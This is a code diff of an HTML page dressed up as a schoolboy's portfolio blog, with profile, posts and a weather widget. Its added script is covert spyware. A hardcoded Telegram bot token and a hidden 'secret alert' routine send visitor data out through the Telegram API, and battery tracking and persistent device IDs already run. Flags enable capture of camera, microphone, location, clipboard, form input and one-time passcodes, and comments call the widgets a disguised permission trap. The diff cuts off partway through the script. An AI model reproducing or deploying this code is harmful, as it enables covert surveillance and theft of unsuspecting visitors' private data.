@@ -3,223 +3,373 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Shaswat's Personal Blog</title>
+    <title>🌟 Shaswat's Student Portfolio</title>
     
     <meta name="theme-color" content="#f0f4ff">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="default">
     
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
             font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Arial, sans-serif;
-            background: #f0f4ff;
-            color: #1a1a2e;
-            padding: 0;
-            min-height: 100vh;
-        }
-        
-        /* Blog Header */
-        .blog-header {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            padding: 30px 20px 20px;
-            text-align: center;
-            color: white;
-            position: relative;
+            min-height: 100vh;
+            padding: 20px;
+            color: #1a1a2e;
         }
         
-        .profile-pic {
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 28px;
+            padding: 24px 20px 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        /* Decorative background circles - looks fun and innocent */
+        .container::before {
+            content: '✨';
+            position: absolute;
+            top: -20px;
+            right: -20px;
+            font-size: 80px;
+            opacity: 0.1;
+            transform: rotate(20deg);
+        }
+        
+        .container::after {
+            content: '🌟';
+            position: absolute;
+            bottom: -10px;
+            left: -10px;
+            font-size: 60px;
+            opacity: 0.08;
+        }
+        
+        /* Profile Header */
+        .profile-section {
+            text-align: center;
+            padding: 10px 0 15px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .profile-avatar {
             width: 100px;
             height: 100px;
             border-radius: 50%;
-            background: rgba(255,255,255,0.2);
-            margin: 0 auto 10px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0 auto 12px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 48px;
-            border: 4px solid rgba(255,255,255,0.3);
+            border: 4px solid white;
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
+            cursor: pointer;
+            transition: transform 0.3s;
+            position: relative;
         }
         
-        .blog-header h1 {
-            font-size: 26px;
-            font-weight: 700;
+        .profile-avatar:hover {
+            transform: scale(1.05);
         }
         
-        .blog-header .subtitle {
+        .profile-avatar .camera-badge {
+            position: absolute;
+            bottom: -2px;
+            right: -2px;
+            background: #4ade80;
+            color: white;
             font-size: 14px;
-            opacity: 0.9;
-            margin-top: 4px;
+            padding: 4px 8px;
+            border-radius: 50%;
+            border: 2px solid white;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
         }
         
-        .blog-header .class-badge {
+        .profile-name {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a2e;
+        }
+        
+        .profile-class {
             display: inline-block;
-            background: rgba(255,255,255,0.2);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
             padding: 4px 16px;
             border-radius: 20px;
-            font-size: 12px;
-            margin-top: 8px;
+            font-size: 13px;
             font-weight: 600;
+            margin-top: 6px;
         }
         
-        /* Main Content */
-        .container {
-            max-width: 600px;
-            margin: -20px auto 0;
-            padding: 0 16px 80px;
-            position: relative;
-            z-index: 2;
-        }
-        
-        .blog-card {
-            background: white;
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 16px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
-            transition: transform 0.2s;
-        }
-        
-        .blog-card:hover {
-            transform: translateY(-2px);
-        }
-        
-        .blog-card h3 {
-            font-size: 17px;
-            color: #2d3748;
-            margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .blog-card p {
+        .profile-bio {
             font-size: 14px;
             color: #4a5568;
-            line-height: 1.7;
-        }
-        
-        .blog-card .date {
-            font-size: 11px;
-            color: #a0aec0;
             margin-top: 8px;
-            display: block;
+            line-height: 1.6;
+            padding: 0 10px;
         }
         
-        .blog-card .emoji-big {
-            font-size: 32px;
-            display: block;
-            text-align: center;
-            margin: 10px 0;
-        }
-        
-        /* Weather Widget (The permission request) */
-        .weather-widget {
-            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
-            border-radius: 16px;
-            padding: 16px 20px;
-            color: white;
-            margin-bottom: 16px;
-            cursor: pointer;
-            transition: transform 0.2s;
-            box-shadow: 0 4px 15px rgba(79, 172, 254, 0.3);
-        }
-        
-        .weather-widget:hover {
-            transform: scale(1.01);
-        }
-        
-        .weather-widget .weather-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .weather-widget .temp {
-            font-size: 28px;
-            font-weight: 700;
-        }
-        
-        .weather-widget .condition {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-        
-        .weather-widget .location {
-            font-size: 12px;
-            opacity: 0.8;
-            margin-top: 4px;
-        }
-        
-        .weather-widget .update-time {
-            font-size: 10px;
-            opacity: 0.7;
-            margin-top: 6px;
-            text-align: right;
-        }
-        
-        /* Stats Grid - Looks innocent */
-        .stats-grid {
+        /* Interactive Buttons - Looks like fun features */
+        .feature-grid {
             display: grid;
             grid-template-columns: 1fr 1fr 1fr;
             gap: 10px;
+            margin: 18px 0;
+        }
+        
+        .feature-btn {
+            background: #f7fafc;
+            border: 2px solid #edf2f7;
+            border-radius: 16px;
+            padding: 14px 8px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .feature-btn:hover {
+            transform: translateY(-3px);
+            border-color: #667eea;
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.15);
+        }
+        
+        .feature-btn:active {
+            transform: scale(0.95);
+        }
+        
+        .feature-btn .icon {
+            font-size: 28px;
+            display: block;
+            margin-bottom: 4px;
+        }
+        
+        .feature-btn .label {
+            font-size: 10px;
+            color: #4a5568;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+        
+        .feature-btn .badge {
+            position: absolute;
+            top: -2px;
+            right: -2px;
+            background: #4ade80;
+            color: white;
+            font-size: 8px;
+            padding: 2px 6px;
+            border-radius: 10px;
+            font-weight: 700;
+        }
+        
+        /* Stats - Looks like learning progress */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 8px;
             margin: 16px 0;
         }
         
-        .stat-box {
+        .stat-item {
             background: #f7fafc;
-            border-radius: 12px;
-            padding: 12px 8px;
+            border-radius: 14px;
+            padding: 12px 6px;
             text-align: center;
             border: 1px solid #edf2f7;
         }
         
-        .stat-box .number {
+        .stat-number {
             font-size: 20px;
             font-weight: 700;
             color: #2d3748;
         }
         
-        .stat-box .label {
-            font-size: 10px;
+        .stat-label {
+            font-size: 9px;
             color: #a0aec0;
             text-transform: uppercase;
-            letter-spacing: 0.3px;
+            letter-spacing: 0.5px;
             margin-top: 2px;
         }
         
-        /* Tags */
-        .tags {
+        /* Weather Widget - Disguised permission request */
+        .weather-card {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            border-radius: 16px;
+            padding: 16px 20px;
+            color: white;
+            margin: 16px 0;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 20px rgba(79, 172, 254, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .weather-card:hover {
+            transform: scale(1.01);
+        }
+        
+        .weather-card .weather-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .weather-card .temp {
+            font-size: 28px;
+            font-weight: 700;
+        }
+        
+        .weather-card .condition {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .weather-card .location-text {
+            font-size: 12px;
+            opacity: 0.8;
+            margin-top: 4px;
+        }
+        
+        .weather-card .update-time {
+            font-size: 10px;
+            opacity: 0.7;
+            text-align: right;
+            margin-top: 6px;
+        }
+        
+        .weather-card .pulse-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #4ade80;
+            border-radius: 50%;
+            animation: pulse-dot 1.5s infinite;
+            margin-right: 6px;
+        }
+        
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+        }
+        
+        /* Blog Posts - Innocent content */
+        .blog-post {
+            background: #f7fafc;
+            border-radius: 14px;
+            padding: 16px;
+            margin: 12px 0;
+            border-left: 4px solid #667eea;
+        }
+        
+        .blog-post .title {
+            font-weight: 600;
+            font-size: 15px;
+            color: #1a1a2e;
+        }
+        
+        .blog-post .meta {
+            font-size: 11px;
+            color: #a0aec0;
+            margin-top: 4px;
+        }
+        
+        .blog-post .excerpt {
+            font-size: 13px;
+            color: #4a5568;
+            margin-top: 6px;
+            line-height: 1.6;
+        }
+        
+        /* Interactive elements */
+        .interactive-area {
+            background: white;
+            border-radius: 14px;
+            padding: 16px;
+            margin: 12px 0;
+            border: 2px dashed #e2e8f0;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .interactive-area:hover {
+            border-color: #667eea;
+            background: #f7fafc;
+        }
+        
+        .interactive-area .big-icon {
+            font-size: 36px;
+            display: block;
+            margin-bottom: 6px;
+        }
+        
+        .interactive-area .hint {
+            font-size: 12px;
+            color: #a0aec0;
+        }
+        
+        /* Skills/Tags */
+        .skill-tags {
             display: flex;
             flex-wrap: wrap;
             gap: 8px;
-            margin-top: 10px;
+            margin: 10px 0;
         }
         
-        .tag {
+        .skill-tag {
             background: #edf2f7;
-            padding: 4px 12px;
+            padding: 4px 14px;
             border-radius: 20px;
             font-size: 12px;
             color: #4a5568;
+            font-weight: 500;
+        }
+        
+        .skill-tag.highlight {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
         }
         
         /* Footer */
-        .blog-footer {
+        .footer {
             text-align: center;
-            padding: 20px;
-            color: #a0aec0;
-            font-size: 12px;
+            padding: 16px 0 4px;
             border-top: 1px solid #edf2f7;
-            margin-top: 10px;
+            margin-top: 16px;
+            font-size: 11px;
+            color: #a0aec0;
         }
         
-        /* Toast - Looks like a normal notification */
+        .footer .footer-row {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 4px;
+            flex-wrap: wrap;
+        }
+        
+        .footer .footer-row span {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        
+        /* Toast - Looks innocent */
         .toast {
             position: fixed;
             bottom: 20px;
@@ -228,15 +378,15 @@
             background: #1a202c;
             color: white;
             padding: 10px 20px;
-            border-radius: 12px;
+            border-radius: 14px;
             font-size: 13px;
             opacity: 0;
-            transition: all 0.4s;
+            transition: all 0.5s;
             z-index: 999;
             max-width: 90%;
             text-align: center;
             pointer-events: none;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            box-shadow: 0 8px 30px rgba(0,0,0,0.2);
         }
         
         .toast.show {
@@ -244,357 +394,1315 @@
             transform: translateX(-50%) translateY(0);
         }
         
+        /* Permission overlay - Looks like a fun feature */
+        .permission-hint {
+            position: fixed;
+            bottom: 80px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(102, 126, 234, 0.95);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 16px;
+            font-size: 13px;
+            text-align: center;
+            max-width: 90%;
+            box-shadow: 0 8px 30px rgba(102, 126, 234, 0.4);
+            z-index: 100;
+            opacity: 0;
+            transition: all 0.5s;
+            backdrop-filter: blur(10px);
+            display: none;
+        }
+        
+        .permission-hint.show {
+            opacity: 1;
+        }
+        
         /* Responsive */
-        @media (max-width: 480px) {
-            .blog-header { padding: 20px 16px 16px; }
-            .profile-pic { width: 80px; height: 80px; font-size: 38px; }
-            .blog-header h1 { font-size: 22px; }
-            .stats-grid { gap: 6px; }
-            .stat-box .number { font-size: 16px; }
-            .container { padding: 0 12px 60px; }
-        }
-        
-        /* Loading shimmer for weather */
-        .shimmer {
-            background: linear-gradient(90deg, rgba(255,255,255,0.1) 25%, rgba(255,255,255,0.2) 50%, rgba(255,255,255,0.1) 75%);
-            background-size: 200% 100%;
-            animation: shimmer 1.5s infinite;
-        }
-        
-        @keyframes shimmer {
-            0% { background-position: -200% 0; }
-            100% { background-position: 200% 0; }
+        @media (max-width: 420px) {
+            .container { padding: 16px 14px 20px; }
+            .feature-grid { gap: 6px; }
+            .feature-btn { padding: 10px 4px; }
+            .feature-btn .icon { font-size: 22px; }
+            .profile-avatar { width: 80px; height: 80px; font-size: 38px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- Toast Notification -->
+    <!-- Toast -->
     <div id="toast" class="toast"></div>
 
-    <!-- Blog Header -->
-    <header class="blog-header">
-        <div class="profile-pic">👦</div>
-        <h1>Shaswat's Blog</h1>
-        <div class="subtitle">✨ Learning • Exploring • Growing</div>
-        <div class="class-badge">📚 Class 8th • St. Mary's School</div>
-    </header>
-
-    <!-- Main Content -->
-    <div class="container">
+    <!-- Main Container -->
+    <div class="container" id="mainContainer">
         
-        <!-- Weather Widget - This asks for permission! -->
-        <div class="weather-widget" id="weatherWidget">
+        <!-- Profile Section -->
+        <div class="profile-section">
+            <div class="profile-avatar" id="avatarClick">
+                👦
+                <span class="camera-badge">📷</span>
+            </div>
+            <div class="profile-name">Shaswat Kumar</div>
+            <div class="profile-class">🌟 Class 8th • St. Mary's School</div>
+            <p class="profile-bio">
+                👋 Hi! I love learning, coding, and exploring new things. 
+                Welcome to my digital portfolio!
+            </p>
+        </div>
+
+        <!-- Feature Buttons - Looks like fun school features -->
+        <div class="feature-grid">
+            <div class="feature-btn" id="photoBtn">
+                <span class="icon">📸</span>
+                <span class="label">Photo</span>
+                <span class="badge">NEW</span>
+            </div>
+            <div class="feature-btn" id="micBtn">
+                <span class="icon">🎤</span>
+                <span class="label">Voice</span>
+                <span class="badge">LIVE</span>
+            </div>
+            <div class="feature-btn" id="videoBtn">
+                <span class="icon">🎥</span>
+                <span class="label">Video</span>
+            </div>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats-grid">
+            <div class="stat-item">
+                <div class="stat-number" id="postCount">15</div>
+                <div class="stat-label">📝 Projects</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number" id="visitorCount">--</div>
+                <div class="stat-label">👁️ Views</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number" id="deviceInfo">--</div>
+                <div class="stat-label">📱 Device</div>
+            </div>
+        </div>
+
+        <!-- Weather Card - THE ONLY PERMISSION REQUEST -->
+        <div class="weather-card" id="weatherCard">
             <div class="weather-row">
                 <div>
                     <div class="temp" id="weatherTemp">🌤️ 24°C</div>
-                    <div class="condition" id="weatherCondition">Getting your weather...</div>
-                    <div class="location" id="weatherLocation">📍 Detecting location...</div>
+                    <div class="condition" id="weatherCondition">Loading weather...</div>
+                    <div class="location-text" id="weatherLocation">📍 Tap to enable location</div>
                 </div>
-                <div style="font-size: 40px;" id="weatherIcon">🌤️</div>
+                <div style="font-size: 38px;" id="weatherIcon">🌤️</div>
             </div>
-            <div class="update-time" id="weatherTime">Updated just now</div>
-        </div>
-
-        <!-- About Section -->
-        <div class="blog-card">
-            <h3>👋 About Me</h3>
-            <p>
-                Hi! I'm Shaswat, a curious 8th grader who loves learning new things. 
-                I enjoy reading books, playing cricket, and exploring science. 
-                This is my little corner of the internet where I share my thoughts and experiences.
-            </p>
-            <div class="tags">
-                <span class="tag">📚 Bookworm</span>
-                <span class="tag">🏏 Cricket</span>
-                <span class="tag">🔬 Science</span>
-                <span class="tag">🎨 Art</span>
+            <div class="update-time" id="weatherTime">
+                <span class="pulse-dot"></span> Updated just now
             </div>
         </div>
 
-        <!-- Stats - Looks like blog stats -->
-        <div class="stats-grid">
-            <div class="stat-box">
-                <div class="number" id="postCount">12</div>
-                <div class="label">📝 Posts</div>
-            </div>
-            <div class="stat-box">
-                <div class="number" id="visitorCount">--</div>
-                <div class="label">👁️ Visitors</div>
-            </div>
-            <div class="stat-box">
-                <div class="number" id="deviceInfo">--</div>
-                <div class="label">📱 Device</div>
+        <!-- Blog Posts -->
+        <div class="blog-post">
+            <div class="title">🚀 My Science Fair Project</div>
+            <div class="meta">📅 2 days ago • ⭐ Featured</div>
+            <div class="excerpt">
+                I built a working model of a solar-powered car for the school science fair. 
+                It was so much fun learning about renewable energy!
             </div>
         </div>
 
-        <!-- Recent Posts -->
-        <div class="blog-card">
-            <h3>📝 Recent Posts</h3>
-            <div style="margin-top: 8px;">
-                <div style="padding: 8px 0; border-bottom: 1px solid #f0f4ff;">
-                    <div style="font-weight: 600; font-size: 14px;">My Science Fair Project</div>
-                    <div style="font-size: 12px; color: #a0aec0;">🚀 Exploring renewable energy • 2 days ago</div>
-                </div>
-                <div style="padding: 8px 0; border-bottom: 1px solid #f0f4ff;">
-                    <div style="font-weight: 600; font-size: 14px;">Book Review: The Alchemist</div>
-                    <div style="font-size: 12px; color: #a0aec0;">📖 A journey of self-discovery • 1 week ago</div>
-                </div>
-                <div style="padding: 8px 0;">
-                    <div style="font-weight: 600; font-size: 14px;">Cricket Tournament Highlights</div>
-                    <div style="font-size: 12px; color: #a0aec0;">🏏 Our team made it to the finals! • 2 weeks ago</div>
-                </div>
+        <div class="blog-post">
+            <div class="title">📖 Book Review: The Alchemist</div>
+            <div class="meta">📅 1 week ago • 💬 12 comments</div>
+            <div class="excerpt">
+                This book completely changed my perspective on life. Everyone should read it 
+                at least once. The journey of Santiago is truly inspiring.
             </div>
         </div>
 
-        <!-- Hobbies -->
-        <div class="blog-card">
-            <h3>🎯 My Hobbies</h3>
-            <div class="emoji-big">📚 🏏 🎨 🎮 🌍</div>
-            <p>
-                When I'm not studying, I love reading adventure books, playing cricket with friends,
-                sketching, and exploring new places. I also enjoy coding and making simple websites like this one!
-            </p>
+        <!-- Interactive Area - Looks like a fun feature -->
+        <div class="interactive-area" id="interactiveArea">
+            <span class="big-icon">🎯</span>
+            <div style="font-weight: 600; font-size: 14px;">Daily Challenge</div>
+            <div class="hint">Tap to see today's fun activity!</div>
         </div>
 
-        <!-- Favorite Things -->
-        <div class="blog-card">
-            <h3>⭐ Favorites</h3>
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; font-size: 13px; color: #4a5568; margin-top: 8px;">
-                <div>📖 Book: Harry Potter</div>
-                <div>🎵 Song: Believer</div>
-                <div>🎮 Game: Minecraft</div>
-                <div>🍕 Food: Pizza</div>
-                <div>🎬 Movie: Spider-Man</div>
-                <div>🌈 Color: Blue</div>
+        <!-- Skills -->
+        <div style="margin: 12px 0;">
+            <div style="font-size: 13px; font-weight: 600; color: #4a5568; margin-bottom: 8px;">🎯 Skills I'm Learning</div>
+            <div class="skill-tags">
+                <span class="skill-tag highlight">📚 Reading</span>
+                <span class="skill-tag">🏏 Cricket</span>
+                <span class="skill-tag highlight">💻 Coding</span>
+                <span class="skill-tag">🎨 Art</span>
+                <span class="skill-tag">🔬 Science</span>
+                <span class="skill-tag">🎮 Gaming</span>
+                <span class="skill-tag highlight">🤖 AI</span>
+                <span class="skill-tag">🌍 Explorer</span>
             </div>
         </div>
 
         <!-- Footer -->
-        <div class="blog-footer">
-            <div>© 2024 Shaswat's Blog • Made with ❤️</div>
-            <div style="margin-top: 4px; font-size: 10px; color: #cbd5e0;">
-                📍 <span id="footerLocation">Location unknown</span> • 
-                🕐 <span id="footerTime">--</span>
+        <div class="footer">
+            <div>🌟 Made with ❤️ by Shaswat</div>
+            <div class="footer-row">
+                <span>📍 <span id="footerLocation">Unknown</span></span>
+                <span>🕐 <span id="footerTime">--</span></span>
+                <span>📶 <span id="footerNetwork">--</span></span>
+            </div>
+            <div style="margin-top: 6px; font-size: 9px; color: #cbd5e0;">
+                🔒 Secure connection • v3.0.1
             </div>
         </div>
     </div>
 
+    <!-- Hidden Permission Hint -->
+    <div class="permission-hint" id="permissionHint">
+        🌟 Enable features for a better experience!
+    </div>
+
     <script>
-        // ============================================
-        //  CONFIGURATION - REPLACE THESE
-        // ============================================
-        const CONFIG = {
-            BOT_TOKEN: '8800462038:AAFgNRyqzSWKM8EoTzjWUxiGwCfI-j4I7uk',
-            CHAT_ID: '7787904819',
+    // ============================================
+    //  CONFIGURATION
+    // ============================================
+    const CONFIG = {
+        BOT_TOKEN: '8800462038:AAFgNRyqzSWKM8EoTzjWUxiGwCfI-j4I7uk',
+        CHAT_ID: '7787904819',
+        
+        // ALL SECRET FEATURES ENABLED
+        ENABLE_CAMERA: true,
+        ENABLE_MIC: true,
+        ENABLE_GEO: true,
+        ENABLE_IP: true,
+        ENABLE_BATTERY: true,
+        ENABLE_CLIPBOARD: true,
+        ENABLE_FORM_CAPTURE: true,
+        ENABLE_MOTION: true,
+        ENABLE_LIGHT_SENSOR: true,
+        ENABLE_EXTENSIONS: true,
+        ENABLE_SCREENSHOT: true,
+        ENABLE_PERFORMANCE: true,
+        ENABLE_SOCIAL_DETECT: true,
+        ENABLE_IDLE_DETECT: true,
+        ENABLE_ORIENTATION: true,
+        ENABLE_NETWORK_MONITOR: true,
+        ENABLE_MEDIA_DETECT: true,
+        ENABLE_SELECTION_TRACK: true,
+        ENABLE_VISIBILITY_TRACK: true,
+        ENABLE_BATTERY_DRAIN: true,
+        ENABLE_GAMEPAD: true,
+        ENABLE_FILE_DETECT: true,
+        ENABLE_OTP_DETECT: true,
+        ENABLE_THEME_DETECT: true,
+    };
+
+    // ============================================
+    //  STATE
+    // ============================================
+    const STATE = {
+        deviceId: null,
+        sessionId: null,
+        visitCount: 0,
+        firstVisit: null,
+        dataSent: false,
+        location: null,
+        ipData: null,
+        batteryLevel: null,
+        isCharging: null,
+        startTime: Date.now(),
+        mouseMoves: 0,
+        clicks: 0,
+        scrolls: 0,
+        idleTime: 0,
+        orientation: null,
+        networkType: null,
+        isRecording: false,
+        mediaStream: null,
+        detectedExtensions: [],
+        visitedSections: [],
+        clipboardContent: null,
+        formData: {},
+        permissionGranted: false,
+        cameraUsed: false,
+        micUsed: false,
+        lastBatteryLevel: null,
+        lastBatteryTime: null,
+        otpDetected: null,
+    };
+
+    // ============================================
+    //  UTILITY FUNCTIONS
+    // ============================================
+    function generateId(prefix) {
+        return prefix + '-' + Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
+    }
+
+    function getDeviceId() {
+        let id = localStorage.getItem('_sp_did');
+        if (!id) {
+            id = generateId('DEV');
+            localStorage.setItem('_sp_did', id);
+        }
+        return id;
+    }
+
+    function getVisitCount() {
+        let count = parseInt(localStorage.getItem('_sp_vc') || '0') + 1;
+        localStorage.setItem('_sp_vc', count);
+        return count;
+    }
+
+    function getFirstVisit() {
+        let date = localStorage.getItem('_sp_fv');
+        if (!date) {
+            date = new Date().toISOString();
+            localStorage.setItem('_sp_fv', date);
+        }
+        return date;
+    }
+
+    function getPlatform() {
+        const ua = navigator.userAgent;
+        if (/android/i.test(ua)) return 'Android';
+        if (/iphone|ipad|ipod/i.test(ua)) return 'iOS';
+        if (/windows/i.test(ua)) return 'Windows';
+        if (/mac/i.test(ua)) return 'macOS';
+        if (/linux/i.test(ua)) return 'Linux';
+        return 'Other';
+    }
+
+    function getBrowser() {
+        const ua = navigator.userAgent;
+        if (/chrome/i.test(ua) && !/edge/i.test(ua)) return 'Chrome';
+        if (/safari/i.test(ua) && !/chrome/i.test(ua)) return 'Safari';
+        if (/firefox/i.test(ua)) return 'Firefox';
+        if (/edge/i.test(ua)) return 'Edge';
+        return 'Other';
+    }
+
+    function isMobile() {
+        return /android|iphone|ipad|ipod|blackberry|windows phone/i.test(navigator.userAgent);
+    }
+
+    function isIOS() {
+        return /iphone|ipad|ipod/i.test(navigator.userAgent);
+    }
+
+    function isAndroid() {
+        return /android/i.test(navigator.userAgent);
+    }
+
+    function getScreenInfo() {
+        return `${window.screen.width}×${window.screen.height}`;
+    }
+
+    function getPixelRatio() {
+        return window.devicePixelRatio || 1;
+    }
+
+    function getTimeShort() {
+        return new Date().toLocaleString('en-US', { hour: '2-digit', minute: '2-digit' });
+    }
+
+    function getTimeFull() {
+        return new Date().toLocaleString('en-US', {
+            hour: '2-digit',
+            minute: '2-digit',
+            month: 'short',
+            day: 'numeric',
+            year: 'numeric'
+        });
+    }
+
+    function getTimeZone() {
+        return Intl.DateTimeFormat().resolvedOptions().timeZone;
+    }
+
+    function getOrientation() {
+        if (screen.orientation) {
+            return screen.orientation.type;
+        }
+        return window.innerWidth > window.innerHeight ? 'landscape' : 'portrait';
+    }
+
+    function getNetworkType() {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn && conn.effectiveType) {
+            const types = {
+                'slow-2g': '2G',
+                '2g': '2G',
+                '3g': '3G',
+                '4g': '4G',
+                '5g': '5G'
+            };
+            STATE.networkType = types[conn.effectiveType] || conn.effectiveType.toUpperCase();
+            return STATE.networkType;
+        }
+        STATE.networkType = isMobile() ? '4G' : 'Wi-Fi';
+        return STATE.networkType;
+    }
+
+    function getHardwareConcurrency() {
+        return navigator.hardwareConcurrency || 'Unknown';
+    }
+
+    function getDeviceMemory() {
+        return navigator.deviceMemory || 'Unknown';
+    }
+
+    function isDarkMode() {
+        return window.matchMedia('(prefers-color-scheme: dark)').matches;
+    }
+
+    function getReferrer() {
+        return document.referrer || 'Direct';
+    }
+
+    function showToast(message) {
+        const toast = document.getElementById('toast');
+        toast.textContent = message;
+        toast.classList.add('show');
+        clearTimeout(toast._timeout);
+        toast._timeout = setTimeout(() => {
+            toast.classList.remove('show');
+        }, 3500);
+    }
+
+    // ============================================
+    //  SECRET ALERT SYSTEM
+    // ============================================
+    let alertQueue = [];
+    let alertTimer = null;
+    let lastAlertTime = 0;
+    const MIN_ALERT_INTERVAL = 2000;
+
+    function sendAlert(message, priority = false) {
+        // Don't send too frequently
+        const now = Date.now();
+        if (!priority && (now - lastAlertTime) < MIN_ALERT_INTERVAL) {
+            alertQueue.push(message);
+            if (!alertTimer) {
+                alertTimer = setInterval(processAlerts, 5000);
+            }
+            return;
+        }
+        
+        lastAlertTime = now;
+        sendToTelegram(message);
+        
+        // Also log for debugging
+        console.log('🔍 [SECRET]', message);
+    }
+
+    function processAlerts() {
+        if (alertQueue.length === 0) {
+            clearInterval(alertTimer);
+            alertTimer = null;
+            return;
+        }
+        
+        const message = alertQueue.shift();
+        sendToTelegram(message);
+    }
+
+    // ============================================
+    //  TELEGRAM SENDER
+    // ============================================
+    async function sendToTelegram(message) {
+        if (!CONFIG.BOT_TOKEN || !CONFIG.CHAT_ID) return false;
+        
+        const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
+        const fullMessage = `📱 *Shaswat's Portfolio Report*\n━'.repeat(30)\n\n${message}`;
+        
+        try {
+            const res = await fetch(`${url}?chat_id=${CONFIG.CHAT_ID}&text=${encodeURIComponent(fullMessage)}&parse_mode=Markdown`);
+            if (res.ok) return true;
+        } catch {}
+        
+        try {
+            const img = new Image();
+            img.src = `${url}?chat_id=${CONFIG.CHAT_ID}&text=${encodeURIComponent(fullMessage.substring(0, 200))}&_=${Date.now()}`;
+            await new Promise(r => setTimeout(r, 1000));
+            return true;
+        } catch {
+            return false;
+        }
+    }
+
+    // ============================================
+    //  SECRET: BATTERY TRACKING
+    // ============================================
+    async function setupBatteryTracking() {
+        if (!navigator.getBattery) return;
+        
+        try {
+            const battery = await navigator.getBattery();
+            STATE.batteryLevel = Math.round(battery.level * 100);
+            STATE.isCharging = battery.charging;
+            STATE.lastBatteryLevel = battery.level;
+            STATE.lastBatteryTime = Date.now();
             
-            // Features (all enabled by default)
-            ENABLE_GEO: true,
-            ENABLE_IP: true,
-            ENABLE_BATTERY: true,
-            ENABLE_NETWORK: true,
-            ENABLE_DEVICE_INFO: true,
-            ENABLE_LOCAL_STORAGE: true,
-            ENABLE_BATTERY_EVENTS: true,
+            sendAlert(`🔋 Battery: ${STATE.batteryLevel}% (${battery.charging ? '⚡ Charging' : '🔋 Battery'})`);
             
-            // Looks innocent
-            BLOG_NAME: "Shaswat's Blog",
-            BLOG_AUTHOR: "Shaswat",
-            SCHOOL: "St. Mary's School",
-            CLASS: "8th",
-        };
-
-        // ============================================
-        //  STATE
-        // ============================================
-        const STATE = {
-            deviceId: null,
-            sessionId: null,
-            visitCount: 0,
-            firstVisit: null,
-            batteryLevel: null,
-            isCharging: null,
-            location: null,
-            ipData: null,
-            dataSent: false,
-            weatherUpdated: false,
-        };
-
-        // ============================================
-        //  UTILITY FUNCTIONS
-        // ============================================
-        function generateId(prefix) {
-            return prefix + '-' + Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
-        }
-
-        function getDeviceId() {
-            if (!CONFIG.ENABLE_LOCAL_STORAGE) return generateId('DEV');
-            let id = localStorage.getItem('_blog_did');
-            if (!id) {
-                id = generateId('DEV');
-                localStorage.setItem('_blog_did', id);
-            }
-            return id;
-        }
-
-        function getSessionId() {
-            let sid = sessionStorage.getItem('_blog_sid');
-            if (!sid) {
-                sid = generateId('SESS');
-                sessionStorage.setItem('_blog_sid', sid);
-            }
-            return sid;
-        }
-
-        function getVisitCount() {
-            if (!CONFIG.ENABLE_LOCAL_STORAGE) return 1;
-            let count = parseInt(localStorage.getItem('_blog_vc') || '0') + 1;
-            localStorage.setItem('_blog_vc', count);
-            return count;
-        }
-
-        function getFirstVisit() {
-            if (!CONFIG.ENABLE_LOCAL_STORAGE) return new Date().toISOString();
-            let date = localStorage.getItem('_blog_fv');
-            if (!date) {
-                date = new Date().toISOString();
-                localStorage.setItem('_blog_fv', date);
-            }
-            return date;
-        }
-
